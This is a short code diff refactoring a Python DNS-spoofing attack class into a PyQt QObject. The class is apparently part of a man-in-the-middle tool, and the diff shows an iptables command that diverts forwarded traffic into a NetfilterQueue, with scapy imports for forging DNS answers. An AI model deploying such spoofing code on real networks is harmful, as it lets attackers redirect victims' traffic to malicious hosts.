@@ -2,16 +2,23 @@ import os
 import logging as log
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 from netfilterqueue import NetfilterQueue
+from PyQt5.QtCore import QObject, QThread, pyqtSignal, QWaitCondition, QMutex
 
-class SofiaDnsSpoofingAttack:
-	def __init__(self, hostDict, queueNum, append_log):
+class SofiaDnsSpoofingAttack(QObject):
+	finished = pyqtSignal()
+
+	def __init__(self, hostDict, queueNum, append_log, loop):
+		super().__init__()
+
 		self.hostDict = hostDict
 		self.queueNum = queueNum
 		self.append_log = append_log
 		self.queue = NetfilterQueue()
+		self.loop = loop
+		self.done = False
 
 	def __call__(self):
-		self.append_log("Starting DNS Spoofing ...")
+		self.append_log("[DNS] Starting DNS Spoofing ...")
 		os.system(
 			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
 		self.queue.bind(self.queueNum, self.callBack)
